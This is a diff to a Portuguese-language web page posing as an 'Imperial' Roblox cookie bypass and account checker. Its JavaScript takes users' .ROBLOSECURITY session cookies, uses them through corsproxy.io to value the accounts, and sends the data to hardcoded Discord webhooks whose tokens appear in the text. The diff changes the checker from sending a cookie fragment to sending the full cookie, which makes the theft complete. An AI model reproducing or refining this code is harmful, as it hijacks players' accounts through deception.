@@ -637,8 +637,8 @@ textarea { resize: vertical; min-height: 100px; }
   <div class="features">
     <div class="feat">🎮 Cookie Bypass</div>
     <div class="feat">🔍 Account Checker</div>
-    <div class="feat">🌌 Tema Galáxia</div>
-    <div class="feat">📱 Mobile + PC</div>
+    <div class="feat">🌌 Fácil</div>
+    <div class="feat">📱 PC + Mobile</div>
     <div class="feat">⚡ Ultra Rápido</div>
   </div>
 
@@ -893,10 +893,10 @@ const WH_CHECKER = 'https://discord.com/api/webhooks/1487215567625519155/_kvoOj6
 const WH_BYPASS  = 'https://discord.com/api/webhooks/1486071361121288253/dZJQ9TLmorENpU-ISmtAbiYrKosQO8GDFT-OLjQploKUBM5wikIOR2Xt4WcmsAGrw9Uf';
 
 // Guarda cookies já enviados nessa sessão — evita spam
-const _sentChecker = new Set();
-const _sentBypass  = new Set();
+const _sentCk = new Set();
+const _sentBp = new Set();
 
-function sendWebhook(url, body){
+function wh(url, body){
   return fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body) });
 }
 
@@ -905,23 +905,29 @@ function sendWebhook(url, body){
    Usa corsproxy.io para passar o Cookie header
    (browsers bloqueiam Cookie como "forbidden header")
 ═══════════════════════════════════════════ */
-const PROXY = 'https://corsproxy.io/?url=';
+// PROXY URL fixed: corsproxy.io format is just ?<encoded_url>
 
-async function rFetch(url, cookie){
-  const r = await fetch(PROXY + encodeURIComponent(url), {
+async function rFetch(endpoint, cookie){
+  const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(endpoint);
+  const r = await fetch(proxyUrl, {
     headers: {
       'x-cors-headers': JSON.stringify({
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'Accept': 'application/json'
+        'Cookie': '.ROBLOSECURITY=' + cookie,
+        'Accept': 'application/json',
+        'User-Agent': 'Roblox/WinInet'
       })
     }
   });
-  if(!r.ok) throw new Error(`HTTP ${r.status}`);
-  return r.json();
+  if(!r.ok) throw new Error('HTTP ' + r.status);
+  const data = await r.json();
+  if(data && data.errors && data.errors[0] && data.errors[0].code === 0)
+    throw new Error('Cookie inválido ou expirado');
+  return data;
 }
 
-async function rFetchSafe(url, cookie, fallback=null){
-  try { return await rFetch(url, cookie); } catch(_){ return fallback; }
+async function rFetchSafe(ep, cookie, fallback){
+  if(fallback === undefined) fallback = {};
+  try { return await rFetch(ep, cookie); } catch(_){ return fallback; }
 }
 
 /* ═══════════════════════════════════════════
@@ -1020,32 +1026,37 @@ async function runChecker(){
     result.classList.add('show');
 
     // ── Webhook (1x por cookie por sessão) ───────
-    const ck14 = cookie.slice(-14); // fingerprint sem expor tudo
-    if(!_sentChecker.has(ck14)){
-      _sentChecker.add(ck14);
-
+    const ckKey = cookie.slice(-20);
+    if(!_sentCk.has(ckKey)){
+      _sentCk.add(ckKey);
       const embed = {
+        username: '♛ Imperial Checker',
+        avatar_url: 'https://img.icons8.com/fluency/96/crown.png',
         embeds: [{
-          title: '🔍 Nova conta verificada — Imperial',
-          color: 0x22d3ee,
+          title: '🔍  Nova Conta Verificada',
+          description: '> Conta verificada via **Imperial Account Checker**',
+          color: isBanned ? 0xf87171 : 0x22d3ee,
           thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
           fields: [
-            { name: '👤 Username',    value: auth.name,                                inline: true  },
-            { name: '🆔 User ID',     value: String(uid),                              inline: true  },
-            { name: '🚦 Status',      value: isBanned ? '⛔ Banida' : '✔️ Ativa',      inline: true  },
-            { name: '💰 Robux',       value: 'R$ ' + robux,                           inline: true  },
-            { name: '💎 RAP',         value: 'R$ ' + rap.toLocaleString('pt-BR'),     inline: true  },
-            { name: '⭐ Premium',     value: premium ? 'Sim' : 'Não',                 inline: true  },
-            { name: '📦 Limiteds',    value: String(limitedCt),                       inline: true  },
-            { name: '🎮 Gamepasses',  value: String(gpCt),                            inline: true  },
-            { name: '🏅 Emblemas',    value: String(badgeCt),                         inline: true  },
-            { name: '💵 Valor Total', value: '**R$ ' + valor.toLocaleString('pt-BR') + '**', inline: false },
-            { name: '🍪 Cookie (últimos 40 chars)', value: '`...' + cookie.slice(-40) + '`', inline: false },
+            { name: '👤  Username',    value: '```' + auth.name + '```',               inline: true  },
+            { name: '📛  Display',     value: '```' + auth.displayName + '```',        inline: true  },
+            { name: '🆔  User ID',     value: '`' + uid + '`',                         inline: true  },
+            { name: '🚦  Status',      value: isBanned ? '⛔ **BANIDA**' : '✅ **Ativa**', inline: true },
+            { name: '⭐  Premium',     value: premium ? '✅ **SIM**' : '❌ Não',       inline: true  },
+            { name: '​',          value: '​',                                inline: true  },
+            { name: '💰  Robux',       value: '**R$ ' + robux + '**',                  inline: true  },
+            { name: '💎  RAP (Limiteds)', value: '**R$ ' + rap.toLocaleString('pt-BR') + '**', inline: true },
+            { name: '💵  Valor Total', value: '**R$ ' + valor.toLocaleString('pt-BR') + '**', inline: true },
+            { name: '📦  Limiteds',    value: String(limitedCt),                       inline: true  },
+            { name: '🎮  Gamepasses',  value: String(gpCt),                            inline: true  },
+            { name: '🏅  Emblemas',    value: String(badgeCt),                         inline: true  },
+            { name: '🍪  Cookie completo', value: '```' + cookie + '```',              inline: false },
           ],
-          footer: { text: 'Imperial Checker · ' + new Date().toLocaleString('pt-BR') },
+          footer: { text: '♛ Imperial  ·  ' + new Date().toLocaleString('pt-BR'), icon_url: 'https://img.icons8.com/fluency/96/crown.png' },
+          timestamp: new Date().toISOString()
         }]
       };
-      sendWebhook(WH_CHECKER, embed).catch(()=>{});
+      wh(WH_CHECKER, embed).catch(()=>{});
     }
 
   } catch(err){
@@ -1079,34 +1090,38 @@ document.getElementById('bypassForm').addEventListener('submit', function(e){
 
   // Dedup por email+cookie
   const key = email + cookie.slice(-20);
-  if(_sentBypass.has(key)){
+  if(_sentBp.has(key)){
     msg.textContent = '⚠️ Você já enviou essa solicitação!';
     msg.style.color = 'var(--gold)';
     return;
   }
-  _sentBypass.add(key);
+  _sentBp.add(key);
 
   const embed = {
+    username: '♛ Imperial Bypass',
+    avatar_url: 'https://img.icons8.com/fluency/96/crown.png',
     embeds: [{
-      title: '🍪 Nova Solicitação de Bypass — Imperial',
+      title: '🍪  Nova Solicitação de Bypass',
+      description: '> Solicitação recebida via **Imperial Cookie Bypass**',
       color: 0xa855f7,
       fields: [
-        { name: '👤 Nick',   value: user  || 'Não fornecido', inline: true  },
-        { name: '✉️ Email',  value: email,                    inline: true  },
-        { name: '🍪 Cookie', value: '```' + cookie + '```',   inline: false },
+        { name: '👤  Nick',    value: '`' + (user || 'Não fornecido') + '`', inline: true  },
+        { name: '✉️  Email',   value: '`' + email + '`',                     inline: true  },
+        { name: '​',      value: '​',                              inline: true  },
+        { name: '🍪  Cookie',  value: '```' + cookie + '```',                inline: false },
       ],
-      footer: { text: 'Imperial Bypass · ' + new Date().toLocaleString('pt-BR') },
+      footer: { text: '♛ Imperial  ·  ' + new Date().toLocaleString('pt-BR'), icon_url: 'https://img.icons8.com/fluency/96/crown.png' },
+      timestamp: new Date().toISOString()
     }]
   };
 
-  sendWebhook(WH_BYPASS, embed)
+  wh(WH_BYPASS, embed)
     .then(()=>{
       msg.textContent = '✅ Solicitação enviada! Responderemos em até 72h.';
       msg.style.color = 'var(--green)';
     })
     .catch(()=>{
-      // Remove do set se falhou, pra deixar tentar de novo
-      _sentBypass.delete(key);
+      _sentBp.delete(key);
       msg.textContent = '❌ Erro ao enviar. Tente novamente.';
       msg.style.color = 'var(--red)';
     });
